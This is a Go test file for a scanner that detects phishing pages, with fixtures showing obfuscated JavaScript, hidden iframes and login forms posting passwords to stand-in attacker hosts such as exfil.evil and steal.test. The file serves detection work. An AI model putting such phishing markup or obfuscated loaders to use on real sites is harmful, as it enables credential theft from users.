package scanner

import (
	"strings"
	"testing"
)

func TestDetectObfuscationSignals(t *testing.T) {
	src := `
		eval(function(p,a,c,k,e,d){return p})("x",0,0,0,0,{});
		var a = String.fromCharCode(104,116,116,112);
		var b = String.fromCharCode(58,47,47);
		eval(a+b);
		var x = "\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c" +
			"\x2e\x74\x65\x73\x74\x2f\x61\x2f\x62\x2f\x63\x2f\x64";
	`
	got := detectObfuscation(src)
	if len(got) == 0 {
		t.Fatal("expected obfuscation signals")
	}
	joined := strings.Join(got, " ")
	if !strings.Contains(joined, "packed") && !strings.Contains(joined, "fromCharCode") && !strings.Contains(joined, "hex") {
		t.Fatalf("unexpected signals: %v", got)
	}
}

func TestDetectHiddenUI(t *testing.T) {
	html := `
<html><body>
<iframe src="https://evil.test/login" style="position:fixed; inset:0; width:100%; height:100%"></iframe>
<div style="display:none"><div class="cf-turnstile" data-sitekey="x"></div></div>
<form style="visibility:hidden"><input type="password" name="p"></form>
</body></html>`
	p := &PageAnalysis{HasPasswordField: true, HasTurnstile: true}
	got := detectHiddenUI(html, p)
	if len(got) < 2 {
		t.Fatalf("expected multiple hidden UI signals, got %v", got)
	}
}

func TestParseFormsCrossOriginExfil(t *testing.T) {
	html := `
<form method="POST" action="https://exfil.evil/collect" autocomplete="off">
  <input type="hidden" name="sid" value="1">
  <input type="hidden" name="campaign" value="2">
  <input type="email" name="user">
  <input type="password" name="pass" autocomplete="off">
</form>`
	forms := parseForms(html, "https://bucket.example/login.html", "bucket.example")
	if len(forms) != 1 {
		t.Fatalf("forms=%d", len(forms))
	}
	f := forms[0]
	if !f.CrossOrigin || f.ActionHost != "exfil.evil" {
		t.Fatalf("cross-origin: %+v", f)
	}
	if f.HiddenFields < 2 || !f.HasPassword || !f.AutofillOff {
		t.Fatalf("exfil detail: %+v", f)
	}
}

func TestAnalyzePageEmitsNewSignals(t *testing.T) {
	html := `<!DOCTYPE html><html><head><title>Sign in</title></head><body>
<script>eval(String.fromCharCode(1,2,3)); Function("return 1");</script>
<iframe src="/x" width="100%" height="100%" style="position:absolute;top:0;left:0;width:100vw;height:100vh"></iframe>
<form method="post" action="https://steal.test/in">
<input type="hidden" name="a" value="1">
<input type="password" name="p">
</form>
</body></html>`
	page := AnalyzePage([]byte(html), "text/html", "https://phish.test/login", "")
	if page == nil {
		t.Fatal("nil page")
	}
	if len(page.Obfuscation) == 0 && len(page.HiddenUI) == 0 {
		t.Fatalf("expected obfuscation or hidden UI, page=%+v", page)
	}
	if len(page.Forms) == 0 || !page.Forms[0].CrossOrigin {
		t.Fatalf("expected cross-origin form, got %+v", page.Forms)
	}
	findings := PageFindings("https://phish.test/login", page)
	joined := ""
	for _, f := range findings {
		joined += f.Message + "\n"
	}
	if !strings.Contains(joined, "form posts off-site") {
		t.Fatalf("missing form finding:\n%s", joined)
	}
}

func TestSkimJavaScriptFindsRedirect(t *testing.T) {
	js := `window.location.href = "https://lander.evil/gate";`
	s := skimJavaScript([]byte(js), "https://cdn.example/app.js", "https://bucket.example/x.html", "")
	found := false
	for _, u := range s.redirects {
		if strings.Contains(u, "lander.evil") {
			found = true
		}
	}
	if !found {
		t.Fatalf("redirects=%v", s.redirects)
	}
}

func TestPrioritizeExternalScripts(t *testing.T) {
	in := []string{
		"https://code.jquery.com/jquery.min.js",
		"https://cdn.kit/redirect.js",
		"https://cdn.kit/misc.js",
	}
	got := prioritizeExternalScripts(in)
	if got[0] != "https://cdn.kit/redirect.js" {
		t.Fatalf("priority order=%v", got)
	}
}
